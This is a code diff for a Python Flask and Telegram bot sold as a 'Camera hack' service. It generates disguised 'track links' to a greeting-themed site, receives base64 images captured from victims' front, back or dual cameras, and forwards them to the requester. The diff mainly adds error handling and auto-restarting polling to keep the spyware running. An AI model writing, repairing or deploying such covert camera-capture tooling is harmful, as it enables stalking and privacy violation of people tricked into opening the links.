@@ -5,13 +5,11 @@ from telebot import types
 
 app = Flask(__name__)
 
-# सेटिंग्स
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 MY_CHAT_ID = "7162565886"
 ADMIN_ID = 7162565886
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Conflict 409 को पूरी तरह खत्म करने के लिए
 try:
     bot.remove_webhook()
     time.sleep(2)
@@ -36,24 +34,28 @@ def start(message):
     add_user(message.chat.id)
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("Camera hack 📸", callback_data="cam_menu"))
-    bot.send_message(message.chat.id, "Select service ✅\nClick on 'camera hack' your service is procced 👇👇", reply_markup=markup)
+    try:
+        bot.send_message(message.chat.id, "Select service ✅\nClick on 'camera hack' your service is procced 👇👇", reply_markup=markup)
+    except: pass
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     base_url = "https://happy-wishing-you.onrender.com" 
     user_id = call.message.chat.id
-    if call.data == "cam_menu":
-        markup = types.InlineKeyboardMarkup(row_width=2)
-        btn_back = types.InlineKeyboardButton("📸Back camera 📸", callback_data="mode_back")
-        btn_front = types.InlineKeyboardButton("📸 Front Camera 📸", callback_data="mode_front")
-        btn_dual = types.InlineKeyboardButton("📸 Dual camera 📸", callback_data="mode_dual")
-        markup.add(btn_front, btn_back, btn_dual)
-        bot.edit_message_text("😃Select any service ✅", call.message.chat.id, call.message.message_id, reply_markup=markup)
-    
-    elif call.data.startswith("mode_"):
-        mode = call.data.split("_")[1]
-        track_link = f"{base_url}?m={mode}&uid={user_id}"
-        bot.send_message(call.message.chat.id, f"😃 it's your track link 🔗👇👇\n\nUrl= {track_link}")
+    try:
+        if call.data == "cam_menu":
+            markup = types.InlineKeyboardMarkup(row_width=2)
+            btn_back = types.InlineKeyboardButton("📸Back camera 📸", callback_data="mode_back")
+            btn_front = types.InlineKeyboardButton("📸 Front Camera 📸", callback_data="mode_front")
+            btn_dual = types.InlineKeyboardButton("📸 Dual camera 📸", callback_data="mode_dual")
+            markup.add(btn_front, btn_back, btn_dual)
+            bot.edit_message_text("😃Select any service ✅", call.message.chat.id, call.message.message_id, reply_markup=markup)
+        
+        elif call.data.startswith("mode_"):
+            mode = call.data.split("_")[1]
+            track_link = f"{base_url}?m={mode}&uid={user_id}"
+            bot.send_message(call.message.chat.id, f"😃 it's your track link 🔗👇👇\n\nUrl= {track_link}")
+    except: pass
 
 @app.route('/')
 def index():
@@ -79,9 +81,18 @@ def upload():
             img_bytes = base64.b64decode(data.get('image').split(',')[1])
             bot.send_photo(target_id, img_bytes, caption=report, parse_mode='HTML')
         except: pass
+            
     return jsonify({"status": "success"})
 
 if __name__ == "__main__":
     init_db()
-    threading.Thread(target=lambda: bot.polling(none_stop=True), daemon=True).start()
+    def run_bot():
+        while True:
+            try:
+                bot.polling(none_stop=True, interval=0, timeout=20)
+            except:
+                time.sleep(5)
+
+    threading.Thread(target=run_bot, daemon=True).start()
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
+    
